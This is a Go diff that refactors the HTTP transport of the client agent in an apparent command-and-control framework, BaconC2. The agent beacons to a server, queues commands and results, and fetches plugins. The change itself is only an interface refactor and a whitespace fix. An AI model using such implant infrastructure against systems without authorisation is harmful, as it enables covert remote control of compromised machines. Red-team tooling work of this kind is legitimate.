@@ -8,6 +8,7 @@ import (
 	"net/http"
 	"time"
 
+	"github.com/RabbITCybErSeC/BaconC2/client/core/transport"
 	"github.com/RabbITCybErSeC/BaconC2/pkg/logging"
 	"github.com/RabbITCybErSeC/BaconC2/pkg/models"
 	"github.com/RabbITCybErSeC/BaconC2/pkg/queue"
@@ -37,7 +38,7 @@ type HTTPClientTransport struct {
 	encoderChain   encoders.IChainEncoder
 }
 
-func NewHTTPClientTransport(serverURL, agentID string, commandQueue queue.ICommandQueue, resultQueue queue.IResultQueue, encoderChain encoders.IChainEncoder) *HTTPClientTransport {
+func NewHTTPClientTransport(serverURL, agentID string, commandQueue queue.ICommandQueue, resultQueue queue.IResultQueue, encoderChain encoders.IChainEncoder) transport.ITransportProtocol {
 	return &HTTPClientTransport{
 		serverURL:      serverURL,
 		agentID:        agentID,
@@ -203,7 +204,7 @@ func (t *HTTPClientTransport) GetBeaconInterval() time.Duration {
 
 func (t *HTTPClientTransport) FetchPluginMetadata(pluginName string) (*models.PluginTransferMetadata, error) {
 	url := fmt.Sprintf(pluginMetadataAPIPath, t.serverURL, pluginName)
-	
+
 	resp, err := t.httpClient.Get(url)
 	if err != nil {
 		return nil, fmt.Errorf("failed to fetch plugin metadata: %w", err)
